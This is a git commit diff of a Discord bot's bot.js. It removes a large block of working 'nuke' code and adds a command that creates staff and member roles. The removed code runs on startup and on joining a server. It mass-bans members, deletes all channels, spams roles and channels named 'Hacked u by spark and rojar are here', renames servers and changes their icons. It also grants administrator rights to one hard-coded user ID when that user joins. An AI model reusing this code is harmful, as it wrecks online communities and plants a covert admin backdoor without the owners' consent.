644f67bcdfaa8caaafd5251dda7dab4fbec7c7b2
abboodd <38141887+abboodd@users.noreply.github.com>
2018-05-26 13:57:07 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -16,8 +16,7 @@ console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds
  
  
 });
-  
-
+       
 var prefix = "-"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
@@ -31,448 +30,145 @@ LOka.on("message", message => {
   }
 });
  
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername("Hacked u by spark Is here")
- 
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setGame(`Hacked u by spark and rojar are here`,'https://www.twitch.tv/hix')
- 
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-})
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setName(`Hacked u by spark and rojar are here`)
-})
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-                 if(!message.channel.guild) return;
- 
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
- 
 LOka.on('message', message => {
      
  
-     if (message.content === "k1") {
+     if (message.content === "r-role") {
          LOka.guilds.forEach(m =>{
-  m.createRole({
-        name : "Hacked u by spark and rojar are here",
+   m.createRole({
+        name : "COMMANDER",
         permissions :   [1],
-        color : " #ff0000"
     })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-     m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-    m.createRole({
-        name : "Hacked u by spark and rojar are here",
-        permissions :   [1],
-        color : " #ff0000"
-    })
- 
- 
    
-})
- 
- 
-}
-});
-LOka.on('message', message => {
-         if (message.content === "k") {
-               LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'text');
-m.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-})
-}
-});
- 
-LOka.on('message', message => {
-         if (message.content === "k") {
-                 LOka.guilds.forEach(m =>{
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
-m.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
- 
- 
-})
-}
- 
-});
- 
- 
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' Hacked u by spark Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('Hacked u by spark and rojar are here', 'text');
- 
-      await guild.createChannel('Hacked u by spark and rojar are here', 'voice');
- 
- 
- 
-}
- 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by spark");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-});
- 
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
- 
-LOka.on('guildMemberAdd', member => {
    
-            if (member.id === "270978812962013185") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
+    m.createRole({
+        name : "-----Owners-----",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	
+ m.createRole({
+        name : "ADMIRAL",
+        permissions :   [1],
+    })
+	
+	 m.createRole({
+        name : "MARSHAL",
+        permissions :   [1],
+    })
+	
+	 m.createRole({
+        name : "-----HQ Team-----",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+	
+	 m.createRole({
+        name : "| Head of Staffs",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "| Administrator",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "-----Moderation-----",
+        permissions :   [1],
+        color : " #ff0000"
+	})
+	
+	
+	m.createRole({
+        name : "| Head of Staffs",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "Moderator",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "-----More-----",
+        permissions :   [1],
+        color : " #ff0000"
+	})
+	
+	m.createRole({
+        name : ".VIP FRIENDS",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : ".LEGEND",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : ".SPECIAL  ✓",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : ".ANGEL",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : ".BEST FRIENDS",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "FRIENDS OF SERVER",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "-----Punished-----",
+        permissions :   [1],
+        color : " #ff0000"
+   })
+	
+	m.createRole({
+        name : "1ˢᵗ Warn",
+        permissions :   [1],
+    })
+	
+	
+	m.createRole({
+        name : "2ᶰᵈ Warn",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "Muted",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "-----Bots-----",
+        permissions :   [1],
+        color : " #ff0000"
+   })
+   
+   m.createRole({
+        name : "-Moderation Bots",
+        permissions :   [1],
+    })
+	
+	m.createRole({
+        name : "-Music Bots",
+        permissions :   [1],
+    })
+
+})
+ 
+ 
+}
+});
 
 // THIS  MUST  BE  THIS  WAY
 client.login(process.env.BOT_TOKEN);
